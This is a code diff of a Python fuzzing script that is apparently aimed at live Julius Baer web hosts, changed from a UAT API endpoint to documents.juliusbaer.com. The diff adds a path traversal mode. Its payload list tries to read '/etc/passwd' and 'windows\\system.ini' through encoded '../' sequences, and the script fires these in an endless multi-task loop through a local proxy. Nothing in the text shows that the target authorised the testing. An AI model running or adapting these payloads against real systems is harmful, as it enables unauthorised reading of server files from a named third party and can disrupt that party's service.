@@ -6,9 +6,9 @@ import threading
 import re
 
 # Your curl command with payload placeholder (marked with @@ for fuzzing)
-curl_command = "curl --path-as-is -i -s -k -X $'POST' \
-    -H $'Host: mobileappdashboard-uat.juliusbaer.com' -H $'Content-Length: 0' -H $'Referer: @@' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
-    $'https://mobileappdashboard-uat.juliusbaer.com/api/device/initAuthentication'"
+curl_command = "curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: documents.juliusbaer.com' -H $'Sec-Ch-Ua: \"Chromium\";v=\"129\", \"Not=A?Brand\";v=\"8\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: de-DE,de;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate, br' -H $'If-Modified-Since: Thu, 17 Oct 2024 08:42:01 GMT' -H $'Priority: u=0, i' -H $'Connection: keep-alive' \
+    $'https://documents.juliusbaer.com/kid/@@_de_20221114-112935_ch.pdf'"
 
 proxy_url = "http://127.0.0.1:8080"
 custom_ssl_cert_path = None  # Set to your custom SSL certificate path if needed
@@ -22,13 +22,41 @@ def parse_curl_command(command):
 
 method, url, headers = parse_curl_command(curl_command)
 
-# Define the character sets to use for fuzzing
+# Fuzzing modes
+FUZZ_MODE_RANDOM = "random"
+FUZZ_MODE_TRAVERSAL = "traversal"
+fuzz_mode = FUZZ_MODE_TRAVERSAL  # Set the fuzzing mode here
+
+# Define the character sets to use for fuzzing (for random input)
 charsets = {
     'alpha': string.ascii_letters,
     'numeric': string.digits,
     'alphanumeric': string.ascii_letters + string.digits,
     'special': string.punctuation
 }
+
+# Path traversal payloads for fuzzing
+path_traversal_payloads = [
+    "/../",
+    "/../../",
+    "/../../../",
+    "/../../../../",
+    "/../etc/passwd",
+    "/..%2F..%2F",
+    "/..%00/",
+    "/filename.php;extension",
+    "/filename.asp;extension",
+    "/file%00.jpg",
+    "../",
+    "..\\",
+    "%2e%2e%2f",
+    "%2e%2e\\",
+    "../etc/passwd",
+    "..\\..\\..\\windows\\system.ini",
+    "%2e%2e%5c",
+    "%252e%252e%255c",
+    "%c0%ae%c0%ae%c0%af"
+]
 
 min_length = 1
 max_length = 20
@@ -51,11 +79,16 @@ async def make_request(session, url, method, headers, data, proxy_url):
         print(f"[!] General error: {e}")
 
 # Generate and make requests continuously, fuzzing payload positions
-async def generate_and_make_requests(session, url, method, headers, data, proxy_url):
+async def generate_and_make_requests(session, url, method, headers, data, proxy_url, fuzz_mode):
     while True:
-        length = random.randint(min_length, max_length)
-        charset = random.choice(list(charsets.keys()))
-        payload = ''.join(random.choice(charsets[charset]) for _ in range(length))
+        if fuzz_mode == FUZZ_MODE_RANDOM:
+            # Generate random payload
+            length = random.randint(min_length, max_length)
+            charset = random.choice(list(charsets.keys()))
+            payload = ''.join(random.choice(charsets[charset]) for _ in range(length))
+        elif fuzz_mode == FUZZ_MODE_TRAVERSAL:
+            # Use path traversal payloads
+            payload = random.choice(path_traversal_payloads)
 
         # Fuzz the URL and headers by replacing the placeholder @@ with the generated payload
         fuzzed_url = url.replace('@@', payload)
@@ -75,7 +108,7 @@ async def run():
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
         tasks = []
         for _ in range(num_threads):
-            task = generate_and_make_requests(session, url, method, headers, None, proxy_url)
+            task = generate_and_make_requests(session, url, method, headers, None, proxy_url, fuzz_mode)
             tasks.append(task)
         await asyncio.gather(*tasks)
 
